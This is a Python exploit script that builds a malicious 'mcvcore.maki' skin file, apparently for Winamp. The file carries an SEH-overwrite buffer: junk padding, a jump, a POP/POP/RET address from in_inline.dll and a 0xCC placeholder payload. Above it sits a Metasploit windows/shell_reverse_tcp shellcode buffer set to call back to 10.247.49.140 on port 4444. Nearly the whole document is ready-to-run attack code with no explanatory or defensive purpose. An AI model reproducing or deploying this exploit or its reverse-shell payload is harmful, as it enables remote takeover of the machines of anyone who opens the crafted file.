# windows/shell_reverse_tcp - 710 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=10.247.49.140, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PrependMigrate=false, 
# EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=
buf =  ""
buf += "\x89\xe7\xdd\xc7\xd9\x77\xf4\x58\x50\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x4b\x58\x6b"
buf += "\x32\x43\x30\x57\x70\x57\x70\x75\x30\x6b\x39\x69\x75"
buf += "\x36\x51\x39\x50\x55\x34\x4e\x6b\x62\x70\x36\x50\x4c"
buf += "\x4b\x62\x72\x34\x4c\x6e\x6b\x36\x32\x44\x54\x6e\x6b"
buf += "\x42\x52\x75\x78\x66\x6f\x58\x37\x33\x7a\x65\x76\x45"
buf += "\x61\x59\x6f\x6e\x4c\x47\x4c\x31\x71\x51\x6c\x55\x52"
buf += "\x56\x4c\x77\x50\x59\x51\x48\x4f\x44\x4d\x76\x61\x4a"
buf += "\x67\x39\x72\x6c\x32\x71\x42\x61\x47\x6e\x6b\x70\x52"
buf += "\x32\x30\x6c\x4b\x61\x5a\x67\x4c\x6e\x6b\x50\x4c\x64"
buf += "\x51\x73\x48\x5a\x43\x37\x38\x43\x31\x6a\x71\x53\x61"
buf += "\x4c\x4b\x70\x59\x47\x50\x55\x51\x4b\x63\x6c\x4b\x57"
buf += "\x39\x46\x78\x5a\x43\x75\x6a\x71\x59\x4e\x6b\x70\x34"
buf += "\x6c\x4b\x73\x31\x7a\x76\x56\x51\x59\x6f\x4e\x4c\x59"
buf += "\x51\x58\x4f\x46\x6d\x33\x31\x4a\x67\x45\x68\x6b\x50"
buf += "\x61\x65\x6c\x36\x56\x63\x61\x6d\x48\x78\x35\x6b\x71"
buf += "\x6d\x57\x54\x42\x55\x78\x64\x56\x38\x4c\x4b\x30\x58"
buf += "\x65\x74\x65\x51\x78\x53\x53\x56\x4c\x4b\x36\x6c\x70"
buf += "\x4b\x6e\x6b\x56\x38\x67\x6c\x67\x71\x69\x43\x6e\x6b"
buf += "\x36\x64\x4e\x6b\x76\x61\x4e\x30\x4b\x39\x51\x54\x64"
buf += "\x64\x54\x64\x53\x6b\x43\x6b\x71\x71\x72\x79\x73\x6a"
buf += "\x42\x71\x4b\x4f\x69\x70\x43\x6f\x53\x6f\x30\x5a\x4c"
buf += "\x4b\x66\x72\x68\x6b\x4e\x6d\x31\x4d\x72\x48\x50\x33"
buf += "\x34\x72\x63\x30\x57\x70\x32\x48\x74\x37\x72\x53\x55"
buf += "\x62\x33\x6f\x61\x44\x43\x58\x32\x6c\x34\x37\x67\x56"
buf += "\x35\x57\x69\x6f\x78\x55\x4c\x78\x6c\x50\x73\x31\x33"
buf += "\x30\x65\x50\x51\x39\x5a\x64\x73\x64\x70\x50\x32\x48"
buf += "\x31\x39\x6d\x50\x62\x4b\x75\x50\x6b\x4f\x5a\x75\x72"
buf += "\x70\x50\x50\x76\x30\x42\x70\x37\x30\x76\x30\x43\x70"
buf += "\x42\x70\x55\x38\x6b\x5a\x64\x4f\x4b\x6f\x59\x70\x6b"
buf += "\x4f\x59\x45\x6c\x57\x62\x4a\x75\x55\x62\x48\x74\x4a"
buf += "\x4b\x47\x36\x51\x4c\x4c\x33\x58\x56\x62\x53\x30\x56"
buf += "\x71\x51\x4c\x6f\x79\x4b\x56\x71\x7a\x64\x50\x31\x46"
buf += "\x36\x37\x43\x58\x7a\x39\x49\x35\x54\x34\x65\x31\x4b"
buf += "\x4f\x5a\x75\x4c\x45\x4b\x70\x74\x34\x46\x6c\x69\x6f"
buf += "\x30\x4e\x44\x48\x63\x45\x6a\x4c\x33\x58\x68\x70\x4d"
buf += "\x65\x6f\x52\x72\x76\x39\x6f\x6a\x75\x31\x78\x31\x73"
buf += "\x30\x6d\x31\x74\x33\x30\x4e\x69\x49\x73\x32\x77\x61"
buf += "\x47\x43\x67\x46\x51\x5a\x56\x61\x7a\x74\x52\x31\x49"
buf += "\x36\x36\x48\x62\x6b\x4d\x62\x46\x39\x57\x62\x64\x66"
buf += "\x44\x47\x4c\x37\x71\x47\x71\x4c\x4d\x42\x64\x65\x74"
buf += "\x44\x50\x5a\x66\x73\x30\x57\x34\x33\x64\x46\x30\x51"
buf += "\x46\x73\x66\x32\x76\x62\x66\x76\x36\x32\x6e\x51\x46"
buf += "\x53\x66\x31\x43\x76\x36\x65\x38\x53\x49\x58\x4c\x55"
buf += "\x6f\x6b\x36\x59\x6f\x79\x45\x4c\x49\x59\x70\x62\x6e"
buf += "\x50\x56\x52\x66\x79\x6f\x30\x30\x71\x78\x63\x38\x4f"
buf += "\x77\x75\x4d\x65\x30\x6b\x4f\x58\x55\x6f\x4b\x6a\x50"
buf += "\x78\x35\x6d\x72\x76\x36\x53\x58\x6d\x76\x6f\x65\x4f"
buf += "\x4d\x6d\x4d\x39\x6f\x6b\x65\x47\x4c\x65\x56\x71\x6c"
buf += "\x76\x6a\x6f\x70\x39\x6b\x79\x70\x50\x75\x33\x35\x4d"
buf += "\x6b\x62\x67\x65\x43\x53\x42\x42\x4f\x72\x4a\x33\x30"
buf += "\x52\x73\x39\x6f\x58\x55\x41\x41"

# Open new MAKI file for exploit
with open('mcvcore.maki', 'w') as file:

	headr  = '\x46\x47'					# Magic
	headr += '\x03\x04'					# Version
	headr += '\x17\x00\x00\x00'

	types  = '\x01\x00\x00\x00'			# Count
	types += '\x71\x49\x65\x51'			# Types
	types += '\x87\x0D\x51\x4A'
	types += '\x91\xE3\xA6\xB5'
	types += '\x32\x35\xF3\xE7'

	funct  = '\x01\x00\x00\x00'			# Count
	funct += '\x01\x01'					# Class
	funct += '\x00\x00'					# Dummy

	punch  = '\xFF\xFF'					# Length (?)
	punch += '\x41' * 16756				# Junk
	punch += '\xEB\x04\x41\x41'			# JUMP + 4, Junk
	punch += '\xB5\x14\xC0\x12'			# POP/POP/RETURN from in_inline.dll
	punch += '\xCC' * 3000				# Payload

	final  = headr 
	final += types
	final += funct
	final += punch

	file.write(str(final.encode('utf-8')))

if file.closed:
	print("\nExploit generated successfully.")
else:
	print("\nSomething went wrong.")
